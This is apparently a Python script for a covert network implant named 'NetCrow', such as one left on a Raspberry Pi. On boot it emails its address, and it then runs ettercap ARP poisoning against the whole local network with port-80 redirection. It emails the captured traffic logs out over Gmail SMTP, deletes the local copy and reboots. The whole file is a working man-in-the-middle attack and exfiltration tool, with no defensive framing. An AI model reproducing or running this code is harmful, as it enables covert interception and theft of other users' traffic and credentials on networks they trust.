# Imports
import os
import time
import subprocess
import smtplib
import datetime
import os.path
from email.mime.text import MIMEText


# Define Attributes
Version = "1.0"
Creator = "Raspberry"

nettest = 0
Path = os.path.dirname(os.path.abspath(__file__))

Sender = ""
Password = ""
Reciever = ""

SaveDelay = 15		# Time Delay before Saving 
ReRun = 10		# Repetition of Saving

# Define Functions

def SendMail(Subject, Text):

	# Connect to Server
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.ehlo()
	server.starttls()
	server.ehlo
	server.login(Sender, Password)
	
	# Set Text and Subject
	Message = 'Subject: %s\n\n%s' % (Subject, Text)


	# Sending Email
	try:
	        server.sendmail(Sender, Reciever, Message)
	except:
		Time = (datetime.datetime.now()).strftime("%H:%M:%S")
        	Date = time.strftime("%d/%m/%Y")
		tempcmd = "echo Email sending Fail -  " + Time + " the " + Date + " > error.log"
		os.system(tempcmd)
	server.quit()


 
def SendBootUp():
	
	# Send Mail after Boot
	Time = (datetime.datetime.now()).strftime("%H:%M:%S")
	Date = time.strftime("%d/%m/%Y")
	Sub = "NetCrow has started working at " + Time + " the " + Date + " !!!" 
	interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
        interface_get = os.popen(interface_comm).read()
        interface = interface_get[0:4]
	if interface == "wlan":
                interface = "wlan0"
	# Get IP Adress
	ipaddress_comm = "hostname -I"
	ipaddress_get = os.popen(ipaddress_comm).read()
	Text = "Interface	    " + interface +"\nNetwork IP	" + ipaddress_get  
	SendMail(Sub, Text)


def StartAttack():
	
	# Set up Interface String
	interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
	interface_get = os.popen(interface_comm).read()
	interface = interface_get[0:4]
	if interface == "wlan":
		interface = "wlan0"
		
	# Set up Environment
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") 
	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080") 
	
	# Start Ettercap
	command = "ettercap -T -q -i " + interface + " -M arp // // >" + Path + "/ettercap.txt &"
	os.system(command)
	
def GetUpTime():
	UpRead = os.popen("uptime").read()
	UpTime = UpRead[12:25]
	return UpTime

def AutoEmailSend():
	
	# Loop 
	BackupsAnzahl = 0 
	while BackupsAnzahl < ReRun:
		time.sleep(SaveDelay)
		SaveOldFile()
		BackupsAnzahl = BackupsAnzahl + 1

	# Send Mail
	Time = (datetime.datetime.now()).strftime("%H:%M:%S")
       	Date = time.strftime("%d/%m/%Y")
	SubjectAttackFinished = "New Informations - " + Time + " the " + Date + " !!!"
	
	# Getting and Setting Text
	ettertext = open(Path + "/ettercap.txt", 'rb')
	ettermsg = MIMEText(ettertext.read())
	ettertext.close()
	TextAttackFinished = ettermsg

	# Sending Email
	SendMail(SubjectAttackFinished, TextAttackFinished)
		
def SaveOldFile():
	SaveStat = 0 
	vartemp = 0
	while SaveStat == 0: 
		commandtempif = Path + "/Logging/ettercap" + str(vartemp)  + ".txt"
		if (os.path.isfile(commandtempif)):
                        vartemp = vartemp + 1 
		else:
			commtemp = "cp " + Path  + "/ettercap.txt " + Path  + "/Logging/ettercap" + str(vartemp)  + ".txt"
                        os.system(commtemp)
			SaveStat = 1 


# Main Programm

SendBootUp()

try:
	StartAttack()
except:
	ErrSub = "Starting the Atttack FAILED"
	try:
		interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
       		interface_get = os.popen(interface_comm).read()
		UpTimeTemp = GetUpTime()
       		interface = interface_get[0:4]
		ErrText = "Connection to Internet		Yes \nConnection to Network via	" + interface + "\nUptime			      " + UpTimeTemp  
	except:
		ErrText = "Connection to Internet		Yes \nConnection to Network		No" + "\nUptime				   " + UpTimeTemp

	SendMail(ErrSub, ErrText)


# Preparing Reboot
AutoEmailSend()
SaveOldFile()
os.system("rm "+ Path  + "/ettercap.txt")
os.system("reboot")
